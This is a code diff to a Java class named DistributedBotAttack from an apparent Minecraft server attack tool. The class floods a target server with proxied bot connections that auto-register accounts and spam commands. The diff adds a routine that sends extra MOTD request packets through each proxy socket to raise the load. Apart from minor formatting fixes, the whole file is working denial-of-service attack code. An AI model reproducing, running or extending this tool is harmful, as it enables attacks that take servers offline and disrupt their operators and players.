@@ -1,5 +1,7 @@
 package me.alikomi.endminecraft.tasks.attack;
 
+import me.alikomi.endminecraft.Main;
+import me.alikomi.endminecraft.utils.MinecraftPackets;
 import me.alikomi.endminecraft.utils.Util;
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
@@ -9,8 +11,10 @@ import org.spacehq.packetlib.Client;
 import org.spacehq.packetlib.event.session.*;
 import org.spacehq.packetlib.tcp.TcpSessionFactory;
 
+import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
+import java.net.Socket;
 import java.util.*;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
@@ -42,7 +46,7 @@ public class DistributedBotAttack extends Util {
 
     public boolean startAttack() {
         log(ips);
-        log("代理数量： " +ips.size());
+        log("代理数量： " + ips.size());
         log("正在初始化...");
         ips.forEach((po, tp) -> {
             if (po.contains(":")) {
@@ -113,7 +117,7 @@ public class DistributedBotAttack extends Util {
                         } catch (InterruptedException e) {
                             e.printStackTrace();
                         }
-                        
+
                         client.getSession().send(new ClientChatPacket("/register qwnmopzx123 qwnmopzx123"));
 
                         try {
@@ -154,10 +158,11 @@ public class DistributedBotAttack extends Util {
 
             public void disconnected(DisconnectedEvent disconnectedEvent) {
                 String msg = disconnectedEvent.getReason();
-                if (msg.contains("refused") ||msg.contains("here") || !isAttack) return;
+                if (msg.contains("refused") || msg.contains("here") || !isAttack) return;
                 log("用户 " + mc.getProfile().getName() + "断开连接： " + msg);
             }
         });
+        if (Main.leLe) new Thread(() -> getMotd(proxy)).start();
         return client;
     }
 
@@ -168,14 +173,14 @@ public class DistributedBotAttack extends Util {
                 try {
                     connects.forEach((k, v) -> {
                         if (v != null && v.getSession() != null) {
-                            if (! v.getSession().isConnected()) {
+                            if (!v.getSession().isConnected()) {
                                 list.add(k);
                             }
                         } else {
                             list.add(k);
                         }
                     });
-                }catch (Exception e) {
+                } catch (Exception e) {
                     e.printStackTrace();
                 }
                 log("清理了：" + list.size() + " 个线程");
@@ -267,4 +272,24 @@ public class DistributedBotAttack extends Util {
             }
         }).start();
     }
+
+    private void getMotd(Proxy proxy) {
+        try {
+            final Socket socket = new Socket(proxy);
+            socket.connect(new InetSocketAddress(ip, port));
+            if (socket.isConnected() && !socket.isClosed()) {
+                final OutputStream out = socket.getOutputStream();
+                out.write(MinecraftPackets.MOTD_HEAD_PACK);
+                out.flush();
+                out.write(MinecraftPackets.MOTD_GET_PACK);
+                out.flush();
+                out.close();
+            }
+            socket.close();
+        } catch (final Exception e) {
+            log("异常抛出！");
+        }
+    }
+
+
 }
